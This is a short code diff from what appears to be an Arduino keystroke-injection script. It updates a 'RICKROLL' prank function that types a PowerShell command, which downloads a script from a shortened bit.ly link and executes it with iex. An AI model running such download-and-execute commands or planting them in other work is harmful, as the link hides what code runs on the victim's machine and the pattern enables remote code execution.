@@ -77,7 +77,7 @@ void NOTEPAD() { OPENAPP("NOTEPAD"); }
 void POWERSHELL() { OPENAPP("POWERSHELL"); }
 
 ////OBNOXIOUS ALERT
-void RICKROLL() { RUNCOMMAND(); delay(_delay* 3); Keyboard.print("powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')""");  delay(_delay); Press("ENTER");  Keyboard.releaseAll();  }
+void RICKROLL() { RUNCOMMAND(); delay(_delay* 3); Keyboard.print("powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('https://bit.ly/3n8DTGj')""");  delay(_delay); Press("ENTER");  Keyboard.releaseAll();  }
 //From http://www.leeholmes.com/
 
 ////////////////////
